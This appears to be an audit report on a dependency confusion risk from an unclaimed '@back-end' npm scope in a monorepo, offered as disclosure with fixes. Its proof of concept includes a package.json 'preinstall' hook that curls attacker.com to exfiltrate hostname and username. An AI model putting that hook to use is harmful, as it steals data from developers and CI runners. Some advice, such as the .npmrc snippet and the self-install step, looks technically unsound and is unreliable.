### Title
Unclaimed `@back-end` NPM Scope Enables Dependency Confusion Attack on Internal Workspace Packages

### Summary
The monorepo defines three internal workspace packages under the `@back-end` npm scope: `@back-end/api`, `@back-end/chain`, and `@back-end/notifications`. The `@back-end` organization/scope is a generic internal name that is almost certainly unclaimed on the public npm registry. An attacker who registers this scope and publishes malicious packages with a higher version number can achieve remote code execution on any developer or CI/CD system that installs dependencies for this project, particularly in scenarios where pnpm's workspace resolution falls back to the public registry.

### Finding Description
Three internal workspace packages are declared with the `@back-end` scoped name:

- `back-end/apps/api/package.json` declares `"name": "@back-end/api"` [1](#0-0) 
- `back-end/apps/chain/package.json` declares `"name": "@back-end/chain"` [2](#0-1) 
- `back-end/apps/notifications/package.json` declares `"name": "@back-end/notifications"` [3](#0-2) 

The root `back-end/package.json` configures these as workspace members via `"workspaces": ["apps/*"]`. [4](#0-3) 

In pnpm workspaces, packages are resolved locally **only** when they are referenced using the explicit `workspace:` protocol. If any consuming package references `@back-end/api`, `@back-end/chain`, or `@back-end/notifications` without the `workspace:` prefix, or if installation occurs outside the workspace root context (e.g., in a CI step that installs a sub-directory independently), pnpm will query the public npm registry. Because the `@back-end` scope is a generic internal label almost certainly unclaimed on npm, an attacker can register it and publish a malicious package version (e.g., `99.99.99`) that npm/pnpm will prefer over the local workspace copy.

Additionally, the `postinstall` lifecycle hook in `front-end/package.json` runs `node ../notice-gen/index.js`, and `notice-gen/index.js` invokes `npx license-checker@25.0.1` across all sub-project directories including the back-end apps. [5](#0-4)  This `npx` invocation runs in each app directory and resolves packages from the registry, creating an additional surface where registry-resolved packages could be pulled in.

### Impact Explanation
If an attacker claims the `@back-end` npm scope and publishes a malicious package with a higher version, any developer or CI/CD pipeline running `pnpm install` (or `npm install`) in a context where workspace resolution falls back to the public registry will download and execute the attacker-controlled code. npm/pnpm lifecycle scripts (`preinstall`, `postinstall`, `install`) execute automatically during installation, giving the attacker **remote code execution on the developer's machine or the CI/CD runner** with the privileges of the installing process. This can lead to credential theft, supply chain compromise, and lateral movement into production infrastructure.

### Likelihood Explanation
- The `@back-end` scope is a generic internal label with no plausible legitimate public npm owner.
- Registering an npm organization is free and takes minutes.
- pnpm workspace resolution is not guaranteed to be local-only in all installation contexts (e.g., sub-directory installs, Docker build steps that `cd back-end/apps/api && pnpm install`).
- The `postinstall` hook runs automatically on every `pnpm install`, meaning exploitation requires no additional developer action beyond a routine dependency install.
- No authentication or privileged access is required for the attacker.

### Recommendation
1. **Claim the `@back-end` npm scope immediately** by registering the `back-end` organization on npmjs.com and publishing placeholder packages for `@back-end/api`, `@back-end/chain`, and `@back-end/notifications`.
2. **Use the `workspace:` protocol explicitly** for all cross-workspace references to these packages so pnpm never queries the public registry for them.
3. **Add a `.npmrc` or `pnpm-workspace.yaml` setting** to configure `@back-end` packages to always resolve from the local workspace:
   ```
   @back-end:registry=https://registry.npmjs.org  # then mark as private
   ```
   Or use `publishConfig.access: "restricted"` in each internal package's `package.json`.
4. Consider renaming internal workspace packages to a scope that is already owned by the project (e.g., `@hashgraph/` or `@hedera-transaction-tool/`).

### Proof of Concept
1. Visit `https://www.npmjs.com/org/back-end` — confirm the `@back-end` organization is unclaimed.
2. Register the `back-end` organization on npm (free, no approval required).
3. Create a package `@back-end/api` with `package.json`:
   ```json
   {
     "name": "@back-end/api",
     "version": "99.99.99",
     "scripts": {
       "preinstall": "curl https://attacker.com/exfil?host=$(hostname)&user=$(whoami)"
     }
   }
   ```
4. Publish: `npm publish --access public`.
5. On a developer machine, clone the repository and run `pnpm install` inside `back-end/apps/api/` (simulating a CI step that installs a sub-directory independently, without the workspace root context).
6. pnpm queries the public registry, finds version `99.99.99 > 0.29.0-SNAPSHOT`, downloads the malicious package, and executes the `preinstall` script — achieving RCE. [6](#0-5) [7](#0-6) [8](#0-7) [9](#0-8)
